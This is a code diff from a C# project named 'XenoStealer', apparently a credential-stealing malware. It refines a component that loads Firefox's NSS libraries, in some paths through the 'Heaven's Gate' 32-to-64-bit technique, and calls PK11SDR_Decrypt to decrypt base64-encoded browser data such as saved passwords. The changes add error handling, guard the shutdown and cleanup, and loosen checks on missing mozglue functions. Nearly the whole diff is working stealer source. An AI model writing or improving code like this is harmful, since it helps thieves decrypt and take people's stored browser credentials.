@@ -160,15 +160,6 @@ namespace XenoStealer
             Operational = true;
         }
 
-        private static bool IsValidGeckoResourcePath(string GeckoResourcePath)
-        {
-            if (!GeckoResourcePath.EndsWith("\\"))
-            {
-                GeckoResourcePath = GeckoResourcePath + "\\";
-            }
-            return File.Exists(GeckoResourcePath + "nss3.dll") && File.Exists(GeckoResourcePath + "mozglue.dll");
-        }
-
         private void FreeLoadedLibraries() 
         {
             if (UseHeavensGate)
@@ -303,8 +294,7 @@ namespace XenoStealer
                 ulong MozFunctionAddress = HeavensGate.GetProcAddress64(mozGlueLibrary, i);
                 if (MozFunctionAddress == 0)
                 {
-                    KernelFreeLibrary64(mozGlueLibrary);
-                    return 0;
+                    return mozGlueLibrary;//other versions didnt load kernel things, so if it cant find one its fine.
                 }
                 string RealFuncName = i;
                 if (DifferentMatchs.ContainsKey(i))
@@ -487,8 +477,7 @@ namespace XenoStealer
                 data.len = (uint)EncryptedData.Length;
                 InternalStructs.SECItem result = new InternalStructs.SECItem();
                 IntPtr cx = IntPtr.Zero;
-
-                if (PK11SDR_Decrypt(ref data, ref result, cx) == InternalStructs.SECStatus.SECSuccess)
+                if (PK11SDR_Decrypt(ref data, ref result, cx)  == InternalStructs.SECStatus.SECSuccess)
                 {
                     if (result.len > 0)
                     {
@@ -508,25 +497,53 @@ namespace XenoStealer
 
         public string Decrypt(string cypherText)
         {
+            if (!Operational)
+            {
+                throw new Exception("This interface is non-operational!");
+            }
             if (cypherText == null) 
             { 
                 return null; 
             }
-            return Decrypt(Convert.FromBase64String(cypherText));
+
+            byte[] b64Decode;
+            try 
+            {
+                b64Decode = Convert.FromBase64String(cypherText);
+            } 
+            catch 
+            {
+                return null;
+            }
+
+            return Decrypt(b64Decode);
+        }
+        
+        public static bool IsValidGeckoResourcePath(string GeckoResourcePath)
+        {
+            if (!GeckoResourcePath.EndsWith("\\"))
+            {
+                GeckoResourcePath = GeckoResourcePath + "\\";
+            }
+            return File.Exists(GeckoResourcePath + "nss3.dll") && File.Exists(GeckoResourcePath + "mozglue.dll");
         }
 
         public void Dispose() 
         {
-            if (UseHeavensGate)
+            if (Operational) 
             {
-                HeavensGate.Execute64(NSS_Shutdown64);
-            }
-            else 
-            {
-                NSS_Shutdown();
+                if (UseHeavensGate)
+                {
+                    HeavensGate.Execute64(NSS_Shutdown64);
+                }
+                else
+                {
+                    NSS_Shutdown();
+                }
+                FreeLoadedLibraries();
+                Operational = false;
             }
 
-            FreeLoadedLibraries();
 
         }
 
